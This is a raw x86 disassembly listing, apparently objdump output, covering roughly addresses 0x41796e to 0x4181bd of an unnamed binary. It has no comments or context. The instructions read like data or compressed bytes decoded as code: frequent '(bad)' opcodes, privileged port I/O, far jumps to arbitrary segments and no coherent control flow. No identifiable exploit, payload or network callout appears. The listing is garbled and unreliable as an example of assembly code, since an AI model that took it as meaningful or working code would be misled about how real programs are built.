  41796e:	and    BYTE PTR [ecx+0x6239515a],dl
  417974:	sub    edx,DWORD PTR [ecx]
  417976:	cld    
  417977:	mov    al,0x46
  417979:	and    DWORD PTR [edi+0x4bfb27b0],0xa475e70e
  417983:	test   BYTE PTR [edx-0x4c71022b],0xe8
  41798a:	push   esp
  41798b:	push   cs
  41798c:	pop    eax
  41798d:	shr    DWORD PTR [edx-0x77ccf2ba],0x26
  417994:	stos   DWORD PTR es:[edi],eax
  417995:	pusha  
  417996:	mov    ds:0x988bd9a1,eax
  41799b:	xchg   ebx,eax
  41799c:	shl    ecx,0x4d
  41799f:	mov    ecx,0x5d194e09
  4179a4:	pop    edi
  4179a5:	shr    BYTE PTR [ebx+0x74],0xa5
  4179a9:	xchg   edx,eax
  4179aa:	mov    cl,0x30
  4179ac:	int3   
  4179ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179ae:	outs   dx,BYTE PTR ds:[esi]
  4179af:	xchg   edi,eax
  4179b0:	push   ds
  4179b1:	aam    0x77
  4179b3:	mov    ah,BYTE PTR [edi+0x66]
  4179b6:	or     edi,edx
  4179b8:	xchg   edi,eax
  4179b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ba:	xor    BYTE PTR [ebp+0x47],dh
  4179bd:	fisttp WORD PTR [ebp+0x6ae837ba]
  4179c3:	jecxz  0x417983
  4179c5:	(bad)  
  4179c7:	adc    al,0xa8
  4179c9:	add    eax,0x483c77e4
  4179ce:	mov    eax,0xaf0bd82f
  4179d3:	out    dx,al
  4179d4:	cli    
  4179d5:	sti    
  4179d6:	pop    ecx
  4179d7:	jno    0x417a1f
  4179d9:	cdq    
  4179da:	lahf   
  4179db:	xchg   edi,eax
  4179dc:	mov    bh,0x66
  4179de:	sub    ecx,DWORD PTR [ebx+0x73]
  4179e1:	jmp    0x417984
  4179e3:	and    bh,dh
  4179e5:	sbb    al,0x10
  4179e7:	(bad)  
  4179e8:	mov    BYTE PTR [edx-0x2b],cl
  4179eb:	neg    DWORD PTR [ebx-0x8555394]
  4179f1:	mov    dl,0x85
  4179f3:	inc    BYTE PTR [eax-0x65]
  4179f6:	(bad)  
  4179f7:	xor    al,0xdd
  4179f9:	idiv   DWORD PTR [ebx+0x19b496b3]
  4179ff:	dec    esi
  417a00:	xor    esi,DWORD PTR [edx+0x50]
  417a03:	push   edx
  417a04:	adc    DWORD PTR [edi+ebx*4+0x27f83559],0x13
  417a0c:	jns    0x417a39
  417a0e:	adc    eax,0xdb055c38
  417a13:	test   eax,0xd27407be
  417a18:	std    
  417a19:	loope  0x4179f4
  417a1b:	scas   eax,DWORD PTR es:[edi]
  417a1c:	jle    0x4179b7
  417a1e:	fdivr  QWORD PTR [edx-0x32]
  417a21:	sbb    DWORD PTR [edx-0x47c07ecb],ebp
  417a27:	push   edx
  417a28:	dec    esi
  417a29:	stos   DWORD PTR es:[edi],eax
  417a2a:	mov    bh,BYTE PTR [esi+0x1489c049]
  417a30:	pop    edi
  417a31:	ds aas 
  417a33:	lahf   
  417a34:	shl    DWORD PTR [ebx-0x273ec1e7],0x4c
  417a3b:	sub    eax,0x26f11e5a
  417a40:	xchg   esp,eax
  417a41:	int    0x63
  417a43:	pushf  
  417a44:	pop    eax
  417a45:	sbb    cl,BYTE PTR [eax]
  417a47:	sub    DWORD PTR [ecx+edi*4],esp
  417a4a:	std    
  417a4b:	mov    dl,0x7
  417a4d:	xchg   BYTE PTR [edi-0x42e01504],cl
  417a53:	jle    0x417a56
  417a55:	inc    esi
  417a56:	xchg   edi,eax
  417a57:	jae    0x417a3f
  417a59:	das    
  417a5a:	imul   esi,DWORD PTR [edx-0x6c],0x3d
  417a5e:	pop    es
  417a5f:	shr    DWORD PTR [eax+ecx*1-0x2b],1
  417a63:	pop    edi
  417a64:	add    BYTE PTR [esi],0x6b
  417a67:	bound  edi,QWORD PTR [ebx-0x30]
  417a6a:	inc    ebp
  417a6b:	test   BYTE PTR es:[ebx+0x69f514d3],bl
  417a72:	cmp    BYTE PTR [edi],dh
  417a74:	jno    0x417a27
  417a76:	hlt    
  417a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a78:	fmul   DWORD PTR [edx+0x54]
  417a7b:	nop
  417a7c:	data16 rol BYTE PTR [edi],0x6d
  417a80:	pop    ds
  417a81:	adc    al,0x5e
  417a83:	mov    dh,0x57
  417a85:	fistp  DWORD PTR [ecx+ebp*1-0x6a]
  417a89:	xor    al,0x5e
  417a8b:	xchg   edx,eax
  417a8c:	mov    edx,0x60117a65
  417a91:	add    eax,0xe4fb190a
  417a96:	stc    
  417a97:	jno    0x417a27
  417a99:	cld    
  417a9a:	test   eax,0x62ca4737
  417a9f:	cmc    
  417aa0:	mov    ds:0x95fac314,eax
  417aa5:	stos   DWORD PTR es:[edi],eax
  417aa6:	out    0x69,eax
  417aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aa9:	sahf   
  417aaa:	js     0x417a88
  417aac:	loopne 0x417ab2
  417aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aaf:	push   esp
  417ab0:	mov    DWORD PTR [edx],edi
  417ab2:	stos   DWORD PTR es:[edi],eax
  417ab3:	sahf   
  417ab4:	or     DWORD PTR es:[ecx],edi
  417ab7:	int3   
  417ab8:	mov    dh,0x81
  417aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417abb:	push   ss
  417abc:	push   ebp
  417abd:	pop    ecx
  417abe:	popa   
  417abf:	(bad)  
  417ac0:	pop    esp
  417ac1:	call   0xfeb8:0x42ee211f
  417ac8:	pop    edx
  417ac9:	ror    ebx,1
  417acb:	scas   al,BYTE PTR es:[edi]
  417acc:	xchg   esi,eax
  417acd:	aaa    
  417ace:	adc    BYTE PTR ds:0xb661044c,0x55
  417ad5:	mov    ebx,0x914bf055
  417ada:	jmp    0x417aa9
  417adc:	cmp    al,0x6e
  417ade:	int3   
  417adf:	sub    ebx,0xb977f5a2
  417ae5:	ficom  WORD PTR [ebp+0x5c]
  417ae8:	bound  ebx,QWORD PTR [edi+0x63]
  417aeb:	xchg   edi,eax
  417aec:	mov    edi,0xe512e536
  417af1:	push   edi
  417af2:	jge    0x417b23
  417af4:	stos   DWORD PTR es:[edi],eax
  417af5:	popf   
  417af6:	aas    
  417af7:	add    eax,0x873c3f64
  417afc:	sub    eax,0x2a9b29ee
  417b01:	and    BYTE PTR [edx],dl
  417b03:	jnp    0x417b40
  417b05:	ss jnp 0x417b63
  417b08:	neg    BYTE PTR [eax+ebp*2]
  417b0b:	lods   eax,DWORD PTR ds:[esi]
  417b0c:	call   0x730c:0x21b565e4
  417b13:	clc    
  417b14:	data16 sub al,0x69
  417b17:	repnz mov cl,0x84
  417b1a:	inc    edi
  417b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b1c:	dec    eax
  417b1d:	xchg   DWORD PTR [edx-0x4ab4587a],edi
  417b23:	and    dl,cl
  417b25:	test   DWORD PTR [eax+0x41],edi
  417b28:	xchg   ebp,eax
  417b29:	fwait
  417b2a:	push   cs
  417b2b:	adc    eax,DWORD PTR [ebx-0x19459851]
  417b31:	xor    eax,0xb12e779b
  417b36:	adc    BYTE PTR [esi],al
  417b38:	sbb    cl,BYTE PTR [ebx]
  417b3a:	sbb    BYTE PTR [ebx],dl
  417b3c:	test   eax,0x643cf0b0
  417b41:	mov    ds:0xb6d90483,eax
  417b46:	ror    DWORD PTR [edx+edx*2+0x3fa315a0],1
  417b4d:	xor    al,0x96
  417b4f:	or     DWORD PTR [ecx+ecx*4+0x5f9fd32c],esi
  417b56:	fimul  WORD PTR [edi+0x1860c21c]
  417b5c:	cmp    DWORD PTR [edi],eax
  417b5e:	mov    ds:0xffb46826,eax
  417b63:	test   BYTE PTR [edi+edi*1+0x7c9edaa],0xb4
  417b6b:	fwait
  417b6c:	push   es
  417b6d:	adc    eax,0x5f56a90a
  417b72:	test   BYTE PTR [ebp+ecx*2+0x1e],ah
  417b76:	mov    eax,0xb03635bd
  417b7b:	dec    esp
  417b7c:	ret    
  417b7d:	dec    ebx
  417b7e:	mov    fs,edx
  417b80:	adc    eax,0x8781cbd0
  417b85:	xchg   ebx,eax
  417b86:	mov    fs,WORD PTR [ecx+esi*2]
  417b89:	push   ds
  417b8a:	mov    ebp,0x5017f069
  417b8f:	and    al,0xa8
  417b91:	das    
  417b92:	pop    es
  417b93:	adc    ecx,eax
  417b95:	loop   0x417b86
  417b97:	imul   ebx,DWORD PTR [ebx+edi*8-0xb],0xdd3f3083
  417b9f:	call   0x2a3bdfd2
  417ba4:	jge    0x417bce
  417ba6:	xor    al,0xfb
  417ba8:	aaa    
  417ba9:	out    dx,eax
  417baa:	aaa    
  417bab:	loope  0x417c0d
  417bad:	and    al,BYTE PTR [edx+0x49]
  417bb0:	push   ebp
  417bb1:	in     eax,0x32
  417bb3:	sbb    dh,dl
  417bb5:	gs and eax,0x6393434a
  417bbb:	call   0x61f4:0x12062dcb
  417bc2:	lods   eax,DWORD PTR ds:[esi]
  417bc3:	sub    ah,ah
  417bc5:	fsub   st,st(3)
  417bc7:	add    ecx,DWORD PTR [esi-0x55]
  417bca:	ja     0x417b57
  417bcc:	adc    BYTE PTR [ebx-0x7a],0x3c
  417bd0:	or     al,0x7e
  417bd2:	sub    al,0x93
  417bd4:	cmp    al,0x60
  417bd6:	sbb    bh,BYTE PTR ds:0xc7912d6f
  417bdc:	add    dh,BYTE PTR [esi+0x2c]
  417bdf:	cwde   
  417be0:	outs   dx,DWORD PTR ds:[esi]
  417be1:	xchg   DWORD PTR [edi+ecx*4],edx
  417be4:	fidivr DWORD PTR ds:0x747fb8b3
  417bea:	add    eax,esp
  417bec:	ins    BYTE PTR es:[edi],dx
  417bed:	push   esp
  417bee:	inc    ecx
  417bef:	scas   al,BYTE PTR es:[edi]
  417bf0:	(bad)  
  417bf1:	fimul  WORD PTR ds:0x3ad68613
  417bf7:	mov    eax,0x6d6f220b
  417bfc:	mov    al,ds:0x9242e99d
  417c01:	ja     0x417b97
  417c03:	aas    
  417c04:	add    esi,ecx
  417c06:	and    ah,BYTE PTR ds:0xed2f03ee
  417c0c:	cmp    edx,DWORD PTR [ecx+ebp*4]
  417c0f:	(bad)  [edx+0x6a]
  417c12:	jp     0x417b97
  417c14:	xchg   esp,eax
  417c15:	(bad)  
  417c16:	lock xchg edi,eax
  417c18:	mov    esi,0x17896c39
  417c1d:	iret   
  417c1e:	shr    DWORD PTR [eax-0x3b8759a4],0x58
  417c25:	xor    eax,0x4111294
  417c2a:	inc    ecx
  417c2b:	je     0x417bc9
  417c2d:	outs   dx,DWORD PTR ds:[esi]
  417c2e:	mov    bl,0x91
  417c30:	rcr    edi,1
  417c32:	push   ax
  417c34:	push   edi
  417c35:	es jmp 0xb082:0xf582ca0c
  417c3d:	mov    dh,0x92
  417c3f:	popa   
  417c40:	shl    DWORD PTR [ecx],0x93
  417c43:	adc    BYTE PTR [edx+0x72],al
  417c46:	loopne 0x417c42
  417c48:	into   
  417c49:	addr16 adc ebp,esi
  417c4c:	jg     0x417bf5
  417c4e:	adc    ah,BYTE PTR [eax]
  417c50:	mov    ds:0xf92622db,eax
  417c55:	clc    
  417c56:	and    eax,0x1b97a258
  417c5b:	inc    ecx
  417c5c:	fnstcw WORD PTR [ecx+eiz*2]
  417c5f:	enter  0x387b,0x47
  417c63:	push   edx
  417c64:	jae    0x417c72
  417c66:	cmp    bl,BYTE PTR [ebp+ebx*2+0x6825d2d2]
  417c6d:	pop    edi
  417c6e:	js     0x417c78
  417c70:	(bad)  
  417c71:	cdq    
  417c72:	fwait
  417c73:	and    eax,0x2a9767e4
  417c78:	je     0x417c1f
  417c7a:	add    DWORD PTR [eax],edx
  417c7c:	rcl    bh,1
  417c7e:	push   es
  417c7f:	inc    esp
  417c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c81:	mov    ebx,edx
  417c83:	or     ecx,ebp
  417c85:	sub    dl,BYTE PTR [esi+eax*2]
  417c88:	mov    al,0x72
  417c8a:	mov    ds:0x55954622,eax
  417c8f:	jg     0x417c28
  417c91:	and    al,0xad
  417c93:	test   BYTE PTR [eax+0x0],dl
	...
  417d12:	add    BYTE PTR [eax],al
  417d14:	mov    esp,0xf767f68f
  417d19:	jg     0x417cd8
  417d1b:	fist   WORD PTR [esi+0x6cba792d]
  417d21:	sbb    eax,0x1f62cc1a
  417d26:	add    DWORD PTR [eax],eax
  417d28:	imul   eax,DWORD PTR [edi],0x93190000
  417d2e:	gs test al,0x8d
  417d31:	(bad)  
  417d32:	and    BYTE PTR [ebp+0x25b79240],cl
  417d38:	ds (bad) 
  417d3a:	rol    DWORD PTR [ebx],cl
  417d3c:	fwait
  417d3d:	pop    ecx
  417d3e:	push   ebp
  417d3f:	jno    0x417d36
  417d41:	add    eax,0x9bd5bc29
  417d46:	mov    edx,0x5bb49af4
  417d4b:	add    ah,al
  417d4d:	or     BYTE PTR [eax+0x69],cl
  417d50:	xchg   ebp,eax
  417d51:	or     edi,DWORD PTR [esi+0x1b5d2256]
  417d57:	shl    BYTE PTR [eax-0x18483856],cl
  417d5d:	mov    eax,ds:0xf560c7e0
  417d62:	dec    esp
  417d63:	aaa    
  417d64:	adc    BYTE PTR [ebx],dh
  417d66:	jl     0x417d7a
  417d68:	inc    edi
  417d69:	fld    QWORD PTR [edx-0x7d]
  417d6c:	mov    esp,0x5f786e92
  417d71:	rcl    cl,cl
  417d73:	cld    
  417d74:	les    ebx,FWORD PTR es:[eax+0x2bf0bad0]
  417d7b:	xchg   ecx,eax
  417d7c:	or     edi,DWORD PTR [edi+0x14]
  417d7f:	out    dx,eax
  417d80:	xor    DWORD PTR ds:0x4bb860f,edi
  417d86:	lods   al,BYTE PTR ds:[esi]
  417d87:	inc    edi
  417d88:	dec    eax
  417d89:	cli    
  417d8a:	push   ebp
  417d8b:	sahf   
  417d8c:	sub    al,BYTE PTR [edx+ebp*4-0x332d9595]
  417d93:	fild   QWORD PTR [ecx]
  417d95:	std    
  417d96:	and    cl,BYTE PTR ds:0x6770d199
  417d9c:	cmp    DWORD PTR [ebp+0xff02ee],esp
  417da2:	mov    eax,0x5232ef81
  417da7:	ss fwait
  417da9:	add    DWORD PTR [ecx+0x1b74b87b],esi
  417daf:	aad    0xb5
  417db1:	dec    edi
  417db2:	pushf  
  417db3:	cli    
  417db4:	lds    edx,FWORD PTR [eax-0x7ce6758a]
  417dba:	cwde   
  417dbb:	outs   dx,DWORD PTR ds:[esi]
  417dbc:	(bad)  
  417dbd:	jno    0x417d57
  417dbf:	popa   
  417dc0:	out    dx,eax
  417dc1:	xchg   edi,eax
  417dc2:	push   0xffffffd2
  417dc4:	cmp    al,0x18
  417dc6:	ins    BYTE PTR es:[edi],dx
  417dc7:	sub    eax,0xa6e5bffa
  417dcc:	jnp    0x417d9d
  417dce:	push   esi
  417dcf:	jl     0x417e0c
  417dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd2:	dec    edx
  417dd3:	imul   edx,edx,0x878459da
  417dd9:	rcl    BYTE PTR [esi+0x62],cl
  417ddc:	(bad)
  417ddf:	mov    al,ds:0xc96b69cc
  417de4:	icebp  
  417de5:	add    edx,DWORD PTR ss:[ecx-0x14]
  417de9:	cmp    bl,BYTE PTR [ebp-0x21]
  417dec:	mov    cl,0x2
  417dee:	ins    DWORD PTR es:[edi],dx
  417def:	jno    0x417e03
  417df1:	sbb    DWORD PTR ds:0xe1c6c386,ebx
  417df7:	adc    esi,ebx
  417df9:	sub    DWORD PTR [eax+0x75c617d8],esp
  417dff:	push   0x27f23462
  417e04:	(bad)  
  417e06:	mov    esp,0x3bd80a43
  417e0b:	int3   
  417e0c:	cmp    ebp,edi
  417e0e:	jecxz  0x417dca
  417e10:	mov    bh,0xaf
  417e12:	hlt    
  417e13:	push   ebx
  417e14:	pop    es
  417e15:	pop    esp
  417e16:	inc    edi
  417e17:	sub    ecx,ebp
  417e19:	push   ebx
  417e1a:	loope  0x417e0d
  417e1c:	xchg   ecx,eax
  417e1d:	outs   dx,BYTE PTR ss:[esi]
  417e1f:	or     dh,BYTE PTR [edx-0x34]
  417e22:	jecxz  0x417e84
  417e24:	icebp  
  417e25:	ss dec ecx
  417e27:	nop
  417e28:	jb     0x417e81
  417e2a:	in     eax,0xdf
  417e2c:	cmp    BYTE PTR [ebp+0x2e],dl
  417e2f:	xor    al,0xf9
  417e31:	mov    ah,0x0
  417e33:	dec    esi
  417e34:	inc    DWORD PTR [edx-0x48]
  417e37:	mov    WORD PTR [ecx],?
  417e39:	mov    ebp,0x5b2a5dca
  417e3e:	sbb    BYTE PTR [eax-0xbe63ab1],bh
  417e44:	inc    ecx
  417e45:	lods   al,BYTE PTR ds:[esi]
  417e46:	hlt    
  417e47:	adc    cl,BYTE PTR [eax+edx*2]
  417e4a:	jge    0x417de9
  417e4c:	pop    edx
  417e4d:	mov    ebx,0xb4c546ca
  417e52:	push   ss
  417e53:	outs   dx,DWORD PTR ds:[esi]
  417e54:	jmp    0x44e6:0x685ca56d
  417e5b:	lahf   
  417e5c:	cwde   
  417e5d:	(bad)  
  417e5e:	push   es
  417e5f:	xchg   esi,eax
  417e60:	rcl    BYTE PTR [edx+0x6bc40b6a],cl
  417e66:	cli    
  417e67:	ss xchg esp,eax
  417e69:	xor    eax,0x9299a4c4
  417e6e:	pop    edx
  417e6f:	push   es
  417e70:	cwde   
  417e71:	inc    ebx
  417e72:	mov    al,ds:0xd4fc5314
  417e77:	jmp    FWORD PTR [edi+esi*1-0x4954588b]
  417e7e:	aaa    
  417e7f:	xor    al,cl
  417e81:	push   ss
  417e82:	loope  0x417e84
  417e84:	nop
  417e85:	sub    esi,DWORD PTR ds:0x9046342
  417e8b:	rol    DWORD PTR [edx-0x57],cl
  417e8e:	cs sbb al,0x26
  417e91:	pop    esp
  417e92:	add    DWORD PTR [edx+0x2378ddee],esp
  417e98:	mov    al,ds:0xa77b4a63
  417e9d:	sti    
  417e9e:	mov    esp,0x5cfefd44
  417ea3:	mov    ebx,0xdda4f383
  417ea8:	cdq    
  417ea9:	push   ecx
  417eaa:	outs   dx,DWORD PTR ds:[esi]
  417eab:	mov    ch,BYTE PTR [ebx+0x3]
  417eae:	sbb    eax,0xce4eb1a0
  417eb3:	xchg   DWORD PTR [eax],ebp
  417eb5:	and    BYTE PTR [ebx+0x77],al
  417eb8:	and    BYTE PTR ds:0xe0435977,bl
  417ebe:	pop    ss
  417ebf:	mov    WORD PTR [eax+0x1d75f5dc],ds
  417ec5:	(bad)  
  417ec6:	call   FWORD PTR [ebp-0x60]
  417ec9:	sub    BYTE PTR [ebp*8+0x75d7aff7],ah
  417ed0:	xor    eax,0x6298e680
  417ed5:	adc    esp,DWORD PTR [ebp-0x4555b1fd]
  417edb:	jg     0x417e67
  417edd:	add    al,0xad
  417edf:	fistp  WORD PTR [esi+0x2d]
  417ee2:	mov    eax,ds:0xb63dc214
  417ee7:	in     eax,0xce
  417ee9:	std    
  417eea:	xchg   edx,eax
  417eeb:	cli    
  417eec:	stos   BYTE PTR es:[edi],al
  417eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eee:	mov    WORD PTR [ebp+0x27],ds
  417ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef2:	hlt    
  417ef3:	mov    esi,ss
  417ef5:	test   BYTE PTR [esi-0x28414595],al
  417efb:	inc    esi
  417efc:	scas   eax,DWORD PTR es:[edi]
  417efd:	pop    es
  417efe:	jge    0x417f5b
  417f00:	retf   
  417f01:	mov    DWORD PTR [edi],ebx
  417f03:	stos   BYTE PTR es:[edi],al
  417f04:	pop    ds
  417f05:	push   esp
  417f06:	dec    edi
  417f07:	mov    BYTE PTR [ebx+0x5bb404c9],cl
  417f0d:	fdiv   QWORD PTR [ebp+0x6e]
  417f10:	mov    ah,0xe8
  417f12:	ds cli 
  417f14:	out    dx,al
  417f15:	ins    BYTE PTR es:[edi],dx
  417f16:	jno    0x417e9c
  417f18:	inc    edi
  417f19:	popf   
  417f1a:	shl    BYTE PTR [ebx-0x13],cl
  417f1d:	retf   
  417f1e:	out    dx,al
  417f1f:	xlat   BYTE PTR ds:[ebx]
  417f20:	mov    bl,BYTE PTR [edi-0x4341e54]
  417f26:	sub    eax,0x34e0a803
  417f2b:	aaa    
  417f2c:	mul    ebx
  417f2e:	cmp    eax,0x9f9365be
  417f33:	(bad)  
  417f34:	mov    BYTE PTR [ecx],0xe6
  417f37:	ins    BYTE PTR es:[edi],dx
  417f38:	jbe    0x417faf
  417f3a:	adc    BYTE PTR [ecx+0x25],al
  417f3d:	and    DWORD PTR [edx-0x13],esi
  417f40:	and    BYTE PTR [ebx],cl
  417f42:	cmp    dh,BYTE PTR [ecx+0x49f5eb93]
  417f48:	xor    BYTE PTR [ebx+0xd],0xd1
  417f4c:	fsubr  st,st(7)
  417f4e:	xor    eax,0x308a6491
  417f53:	push   ecx
  417f54:	jecxz  0x417ee0
  417f56:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  417f58:	ret    0xb1c7
  417f5b:	les    ebp,FWORD PTR [esi-0x33]
  417f5e:	mov    BYTE PTR [edx*4-0xbfff328],cl
  417f65:	nop
  417f66:	out    0xfc,eax
  417f68:	arpl   WORD PTR [esi+0x17fa711d],ax
  417f6e:	std    
  417f6f:	push   cs
  417f70:	pop    esi
  417f71:	dec    edi
  417f72:	jne    0x417f11
  417f74:	call   0x2aed:0x63063890
  417f7b:	lods   al,BYTE PTR ds:[esi]
  417f7c:	sub    edi,ecx
  417f7e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  417f80:	loope  0x417f9b
  417f82:	or     BYTE PTR [ecx+0x78],cl
  417f85:	es jmp 0x417fdb
  417f88:	cmp    edi,edi
  417f8a:	mov    edi,0x761115f6
  417f8f:	adc    DWORD PTR [edx],eax
  417f91:	rcl    DWORD PTR [ebp+0x184c1ee8],0x95
  417f98:	push   ds
  417f99:	sbb    BYTE PTR [ecx+0x77],bh
  417f9c:	adc    eax,0x3aff9e2d
  417fa1:	cdq    
  417fa2:	adc    al,0xe
  417fa4:	push   ebp
  417fa5:	or     DWORD PTR [esi-0x7c294356],esp
  417fab:	xchg   edi,eax
  417fac:	mov    ebp,0x7aa7cfee
  417fb1:	push   0xfffffffd
  417fb3:	dec    edi
  417fb4:	cs rcr dh,1
  417fb7:	ret    0x1a06
  417fba:	xchg   DWORD PTR [edx+0x3d029d19],eax
  417fc0:	adc    al,0xb0
  417fc2:	inc    eax
  417fc3:	aas    
  417fc4:	popa   
  417fc5:	jmp    0x4335ebf7
  417fca:	popa   
  417fcb:	sub    ebx,DWORD PTR [ecx]
  417fcd:	adc    ebp,0x12
  417fd0:	and    al,0x58
  417fd2:	outs   dx,DWORD PTR ds:[esi]
  417fd3:	xchg   ebp,eax
  417fd4:	mov    cl,0x39
  417fd6:	inc    eax
  417fd7:	inc    esi
  417fd8:	xchg   BYTE PTR ds:0x18a37477,dh
  417fde:	js     0x417f78
  417fe0:	mov    ebx,0x2e644b87
  417fe5:	ret    
  417fe6:	outs   dx,BYTE PTR ds:[esi]
  417fe8:	mov    ebp,0xf70bd59a
  417fed:	jmp    0x417f91
  417fef:	pop    ecx
  417ff0:	lds    eax,FWORD PTR [ebp-0x164ceda4]
  417ff6:	ins    DWORD PTR es:[edi],dx
  417ff7:	test   eax,0xf428bc8d
  417ffc:	pop    es
  417ffd:	adc    al,0x27
  417fff:	or     ebx,esp
  418001:	fdiv   QWORD PTR [eax+edx*2+0x7cae8cf7]
  418008:	and    BYTE PTR [ebx+0x3a],ch
  41800b:	prefetch (bad)
  41800c:	or     eax,0x602719db
  418011:	loope  0x417fa8
  418013:	push   ss
  418014:	xchg   BYTE PTR [eax+eax*1+0x590ad599],dl
  41801b:	ds push esi
  41801d:	xlat   BYTE PTR ds:[ebx]
  41801e:	cdq    
  41801f:	pushf  
  418020:	adc    eax,0xae575d91
  418025:	pop    ds
  418026:	rep outs dx,BYTE PTR ds:[esi]
  418028:	mov    ds:0x989b77b3,eax
  41802d:	(bad)  
  41802e:	sbb    ebp,DWORD PTR [ecx+ebp*1+0x52]
  418032:	mov    ecx,0x28d8a47a
  418037:	and    eax,0x35e2cca1
  41803c:	es cwde 
  41803e:	jns    0x41806a
  418040:	pop    DWORD PTR [esi-0x24]
  418043:	xchg   DWORD PTR [edi-0x7c],edi
  418046:	mov    WORD PTR [ecx+0xd],?
  418049:	push   0xffffffb9
  41804b:	rcr    bh,1
  41804d:	adc    DWORD PTR [edx],esi
  41804f:	add    ch,BYTE PTR [edi+eiz*1]
  418052:	push   eax
  418053:	inc    edi
  418054:	pop    DWORD PTR [eax+0x3e]
  418057:	shl    BYTE PTR [ebx],0x56
  41805a:	mov    WORD PTR [eax],cs
  41805c:	sbb    BYTE PTR gs:[eax+0x14],dl
  418060:	sub    al,0x86
  418062:	adc    eax,0x41714c8d
  418067:	les    esi,FWORD PTR [ecx+0x7ca9fff9]
  41806d:	push   edx
  41806e:	xor    bl,ch
  418070:	neg    BYTE PTR [edx+0x2c1b98c5]
  418076:	xor    edx,ecx
  418078:	and    ebp,eax
  41807a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41807b:	jno    0x4180eb
  41807d:	test   DWORD PTR ds:0xcd758c70,esp
  418083:	mov    eax,ds:0x3056a9b2
  418088:	ret    0x392d
  41808b:	ins    DWORD PTR es:[edi],dx
  41808c:	sub    bh,BYTE PTR [edx+0x32b49014]
  418092:	out    0x0,al
  418094:	xor    eax,0xdea408c0
  418099:	inc    ecx
  41809a:	int3   
  41809b:	or     ebp,edx
  41809d:	sub    DWORD PTR [ebp+edi*4+0x72],esi
  4180a1:	cmp    edi,DWORD PTR [esi]
  4180a3:	not    DWORD PTR [ebx]
  4180a5:	repz lock fisub DWORD PTR ds:[ecx+0x70]
  4180ab:	cmp    al,0xb4
  4180ad:	add    ah,BYTE PTR [ebx-0x53]
  4180b0:	and    al,0x49
  4180b2:	mov    ah,0x9a
  4180b4:	sbb    BYTE PTR [edx-0x5f61499a],bh
  4180ba:	repz push ebp
  4180bc:	xchg   ecx,eax
  4180bd:	mov    eax,ds:0x34e197fb
  4180c2:	jl     0x4180a8
  4180c4:	sbb    cl,BYTE PTR [eax+0x45103804]
  4180ca:	cmp    al,0x5
  4180cc:	out    0x9a,eax
  4180ce:	mov    bh,0xdc
  4180d0:	jecxz  0x4180e5
  4180d2:	retf   0x3cc
  4180d5:	call   0x22ed7533
  4180da:	gs xchg esi,eax
  4180dc:	and    DWORD PTR [edi],ecx
  4180de:	mov    al,ds:0x9cc4b941
  4180e3:	stc    
  4180e4:	and    DWORD PTR [eax],ebp
  4180e6:	mov    WORD PTR [ecx+0x39],fs
  4180e9:	add    dl,ah
  4180eb:	aad    0x8e
  4180ed:	xchg   esp,eax
  4180ee:	shl    BYTE PTR [ebp-0xa9cb1c1],0xad
  4180f5:	add    eax,0x234b228e
  4180fa:	addr16 in al,dx
  4180fc:	pop    esi
  4180fd:	pop    esi
  4180fe:	sbb    BYTE PTR [edi+0x20],ah
  418101:	lods   al,BYTE PTR ds:[esi]
  418102:	aas    
  418103:	es pop ss
  418105:	inc    ecx
  418106:	sbb    eax,0xac60f37d
  41810b:	in     al,0xe5
  41810d:	fs aad 0x55
  418110:	nop
  418111:	nop
  418112:	adc    al,0x6d
  418114:	fldcw  WORD PTR [edx+0x75476e6e]
  41811a:	ret    0x79b8
  41811d:	test   al,0xfe
  41811f:	and    dl,al
  418121:	sub    BYTE PTR [ecx-0x2f],ah
  418124:	jge    0x4180d2
  418126:	mov    esp,0xf305f96d
  41812b:	mov    edx,0x9de8dce8
  418130:	lea    edx,[esi-0x41]
  418133:	fsubr  st,st(5)
  418135:	lahf   
  418136:	clc    
  418137:	mov    edi,0x17ed8194
  41813c:	jno    0x41810d
  41813e:	jno    0x41818d
  418140:	xchg   BYTE PTR [ebp+0x52c98f76],cl
  418146:	xchg   ebp,eax
  418147:	les    esp,FWORD PTR [edi+ecx*2+0x71]
  41814b:	retf   
  41814c:	(bad)  
  41814d:	fwait
  41814e:	jne    0x418187
  418150:	daa    
  418151:	mov    edi,0xee911311
  418156:	dec    eax
  418157:	add    eax,0x9db592f9
  41815c:	(bad)  
  41815d:	or     eax,0xe95c1f57
  418162:	jl     0x41817a
  418164:	and    al,0x4d
  418166:	(bad)  
  418167:	jmp    0x418104
  418169:	enter  0x1efa,0xe4
  41816d:	mov    edi,0xc09b0468
  418172:	repz into 
  418174:	and    eax,0xfe7851b5
  418179:	pop    edx
  41817a:	ins    DWORD PTR es:[edi],dx
  41817b:	ja     0x418132
  41817d:	repz add DWORD PTR [ebx-0x3986c5e3],eax
  418184:	push   cs
  418185:	sub    eax,0x3a674f6e
  41818a:	test   al,0x4b
  41818c:	inc    edi
  41818d:	xchg   ebx,eax
  41818e:	inc    ebp
  41818f:	fcomp  QWORD PTR gs:[edx-0x1f]
  418193:	cli    
  418194:	jmp    0x4181b7
  418196:	push   0xffffff9b
  418198:	xor    esi,DWORD PTR [edi]
  41819a:	(bad)  [ebx-0x5a]
  41819d:	fs stos BYTE PTR es:[edi],al
  41819f:	sub    BYTE PTR [ecx],ch
  4181a1:	mov    fs,esi
  4181a3:	pop    ss
  4181a4:	fld    st(1)
  4181a6:	jnp    0x4181c9
  4181a8:	ds sbb eax,0x586f1135
  4181ae:	js     0x4181c4
  4181b0:	cdq    
  4181b1:	not    edx
  4181b3:	jno    0x418200
  4181b5:	repnz dec ebp
  4181b7:	dec    edi
  4181b8:	mov    ds:0x258c64bc,eax
  4181bd:	enter  0xa084,0x72
